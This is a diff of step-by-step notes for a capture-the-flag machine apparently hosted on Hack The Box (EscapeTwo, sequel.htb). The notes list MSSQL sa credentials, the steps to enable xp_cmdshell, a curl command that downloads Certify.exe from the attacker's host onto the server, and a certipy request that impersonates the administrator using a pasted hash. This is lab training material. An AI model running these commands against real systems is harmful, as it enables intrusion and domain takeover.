@@ -238,20 +238,20 @@ escapetwo.htb/sa:MSSQLP\\@ssw0rd\\!\\@10.10.11.51
 
 RUN on SERVER: enable_xp_cmdshell
 
-RUN LOGGEDIN on POWERSHELL, on SERVER: mkdir C:\\temp
+RUN Loggedin on SERVER: mkdir C:\\temp
 
 RUN on SERVER: xp_cmdshell curl 10.10.14.184/Certify.exe -o
 C:\\Users\\public\\Certify.exe (Uploads Certify.exe to SERVER)
 
-RUN LOGGEDIN on POWERSHELL, on SERVER: C:\\temp\> ./Certify.exe find
+RUN Loggedin on SERVER: C:\\temp\> ./Certify.exe find
 /domain:sequel.htb
 
 10\. 2nd INFO: Change directory
 
 RUN: cd C:\\temp
 
-12\. INFO: Run Certify.exe. You can see that ca_svc has overridable
-permissions for this certificate 👆, so let\'s overwrite it. (IN NEXT
+12\. INFO: Run Certify.exe. You can see that ca_svc has overwrite
+permissions for this certificate, try to overwrite it. (IN NEXT
 STEP)
 
 RUN: .\\Certify.exe find /domain:sequel.htb
@@ -266,13 +266,6 @@ dc01.sequel.htb
 request is made to obtain an authentication ticket to the target system.
 
 IMPORTANT: Paste HASH 3b181b914e7a9d5508ea1e20bc2b7fce from STEP 9
-
-THIS DID NOT WORK !!!!!! =\>\>
-
-RUN on Kali VM: certipy-ad req -u ca_svc -hashes
-\'3b181b914e7a9d5508ea1e20bc2b7fce\' -ca sequel-DC01-CA -target
-sequel.htb -dc-ip 10.10.11.51 -template DunderMifflinAuthentication -upn
-administrator@sequel.htb -ns 10.10.11.51 -dns 10.10.11.51 -debug
 
 15\. INFO: Get the Administrator\'s hash through the certificate
 
